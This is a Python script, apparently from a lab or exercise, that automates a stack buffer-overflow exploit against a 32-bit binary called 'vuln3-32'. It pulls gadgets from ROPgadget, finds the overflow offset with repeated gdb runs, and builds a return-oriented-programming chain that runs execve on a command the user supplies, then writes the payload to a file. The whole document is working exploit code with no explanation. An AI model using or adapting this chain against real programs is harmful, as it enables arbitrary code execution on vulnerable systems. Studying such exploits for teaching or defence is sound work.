#!/usr/bin/env python
from struct import pack
import subprocess
import os
import sys
import pprint as pp

# run ROPgadget tool to get useful rop gadgets
rop = subprocess.Popen(['ROPgadget', '--binary', 'vuln3-32', '--ropchain', '--silent'],
                     stdout=subprocess.PIPE,
                     universal_newlines=True,
                     bufsize=0)
rop.wait()

rop_gadgets = {
    'stackAddr' : None,
    'mov' : None,
    'popDst' : None,
    'popSrc' : None,
    'xorSrc' : None,
    'popB' : None,
    'popC' : None,
    'popD' : None,
    'xorA' : None,
    'incA' : None,
    'sys' : None
}

for line in rop.stdout:
    if "Step 1" in line:
        while "Step 2" not in line:
            if '[+]' in line:
                gadget = line.split(' ')
                if rop_gadgets['mov'] == None:
                    rop_gadgets['mov'] = (gadget[3], ' '.join(gadget[4:])[:-1])
                elif rop_gadgets['popDst'] == None:
                    rop_gadgets['popDst'] = (gadget[3], ' '.join(gadget[4:])[:-1])
                elif rop_gadgets['popSrc'] == None:
                    rop_gadgets['popSrc'] = (gadget[3], ' '.join(gadget[4:])[:-1])
                elif rop_gadgets['xorSrc'] == None:
                    rop_gadgets['xorSrc'] = (gadget[3], ' '.join(gadget[4:])[:-1])
            if '[-]' in line:
                rop_gadgets['mov'] = None
                rop_gadgets['popDst'] = None
                rop_gadgets['popSrc'] = None
                rop_gadgets['xorSrc'] = None
            line = next(rop.stdout)
    if "Step 2" in line:
        while "Step 3" not in line:
            if '[+]' in line:
                gadget = line.split(' ')
                if rop_gadgets['xorA'] == None:
                    rop_gadgets['xorA'] = (gadget[3], ' '.join(gadget[4:])[:-1])
                elif rop_gadgets['incA'] == None:
                    rop_gadgets['incA'] = (gadget[3], ' '.join(gadget[4:])[:-1])
            line = next(rop.stdout)
    if "Step 3" in line:
        while "Step 4" not in line:
            if '[+]' in line:
                gadget = line.split(' ')
                if rop_gadgets['popB'] == None:
                    rop_gadgets['popB'] = (gadget[3], ' '.join(gadget[4:])[:-1])
                elif rop_gadgets['popC'] == None:
                    rop_gadgets['popC'] = (gadget[3], ' '.join(gadget[4:])[:-1])
                elif rop_gadgets['popD'] == None:
                    rop_gadgets['popD'] = (gadget[3], ' '.join(gadget[4:])[:-1])
            line = next(rop.stdout)
    if "Step 4" in line:
        while "Step 5" not in line:
            if '[+]' in line:
                gadget = line.split(' ')
                rop_gadgets['sys'] = (gadget[3], ' '.join(gadget[4:])[:-1])
            line = next(rop.stdout)
    if "Step 5" in line:
        while '.data' not in line:
            line = next(rop.stdout)
        gadget = line.split(' ')
        rop_gadgets['stackAddr'] = (gadget[3][:-1], ' '.join(gadget[4:])[2:-1])

pp.pprint(rop_gadgets)

padding = 0
found = False

while True:
    os.system('perl -e \'print "A"x{}, "DCBA"\' > input'.format(padding))
    gdb = subprocess.Popen(["gdb", "vuln3-32"],
                            stdin =subprocess.PIPE,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            universal_newlines=True,
                            bufsize=0)

    gdb.stdin.write("r input\n")
    gdb.stdin.close()

    for line in gdb.stdout:
        print(line.strip())
        if 'SIGSEGV' in line:
            line = next(gdb.stdout)
            print(line.split(' ')[0][2:])
            if line.split(' ')[0][2:] == '41424344':
                print("FOUND PADDING:", padding, "\n")
                found = True
                
    if found:
        break
    padding += 4
    print('pad: ', padding, '\n')

STACKADDR = int(rop_gadgets['stackAddr'][0], 0)
STACK = pack("<I", int(rop_gadgets['stackAddr'][0], 0))
MOV = pack("<I", int(rop_gadgets['mov'][0], 0))
POPDST = pack("<I", int(rop_gadgets['popDst'][0], 0))
POPSRC = pack("<I", int(rop_gadgets['popSrc'][0], 0))
XORSRC = pack("<I", int(rop_gadgets['xorSrc'][0], 0))
POPB = pack("<I", int(rop_gadgets['popB'][0], 0))
POPC = pack("<I", int(rop_gadgets['popC'][0], 0))
POPD = pack("<I", int(rop_gadgets['popD'][0], 0))
XORA = pack("<I", int(rop_gadgets['xorA'][0], 0))
INCA = pack("<I", int(rop_gadgets['incA'][0], 0))
SYS = pack("<I", int(rop_gadgets['sys'][0], 0))
PAD = pack("<I", 0x46464646)

command_line = input('Command: ').split()
# print('cmd_line: ', command_line)
bin_exe = command_line[0]
# print('cmd: ', command)
if len(bin_exe) % 4 != 0:
    bin_exe = '/' + bin_exe
    print('com ', bin_exe)

def addPadding(gadget, regsSet):
    result = bytes('', 'ascii')
    # print('gadget: ', gadget, '\n')
    # print('regSet: ', regsSet, '\n')
    gadgetOps = gadget.split(' ; ')
    # print('ops: ', gadgetOps, '\n')
    for g in gadgetOps[1:]:
        g = g.split()
        # print('g: ', g, '\n')
        if g[0] == 'pop':
            reg = g[1]
            try:
                # print('TRY\n')
                # print('regSet: ', regsSet, '\n')
                # print('reg: ',reg,'\n')
                # print('w: ', regsSet[reg], '\n')
                result += pack("<I", STACKADDR + regsSet[reg])
            except KeyError:
                print('EXCEPT\n')
                result += PAD

    return result

# add initial padding
p = bytes('A' * padding, 'ascii')

# put stack address to the destination register which we got from the mov gadget
p += POPDST
p += STACK
p += addPadding(rop_gadgets['popDst'][1], {})

p += POPSRC
p += bytes(bin_exe[0:4], 'ascii')
p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: 0})

p += MOV
p += addPadding(rop_gadgets['mov'][1], {})

p += POPDST
p += pack("<I", STACKADDR + 4)
p += addPadding(rop_gadgets['popDst'][1], {})

p += POPSRC
p += bytes(bin_exe[4:8], 'ascii')
p += addPadding(rop_gadgets['popSrc'][1], {rop_gadgets['popDst'][1].split()[1]: 4})

p += MOV
p += addPadding(rop_gadgets['mov'][1], {})

p += POPDST
p += pack("<I", STACKADDR + 8)
p += addPadding(rop_gadgets['popDst'][1], {})

p += XORSRC
p += addPadding(rop_gadgets['xorSrc'][1], {})

p += MOV
p += addPadding(rop_gadgets['mov'][1], {})

p += POPB
p += STACK
p += addPadding(rop_gadgets['popB'][1], {})

p += POPC
p += pack("<I", STACKADDR + 8)
p += addPadding(rop_gadgets['popC'][1], {'ebx': 0})

p += POPD
p += pack("<I", STACKADDR + 8)
p += addPadding(rop_gadgets['popD'][1], {'ebx': 0, 'ecx': 8})

p += XORA
p += addPadding(rop_gadgets['xorA'][1], {'ebx': 0, 'ecx': 8})

for _ in range(11):
    p += INCA
    p += addPadding(rop_gadgets['incA'][1], {'ebx': 0, 'ecx': 8})

p += SYS

f = open('testNew', 'wb')
f.write(p)
f.close()
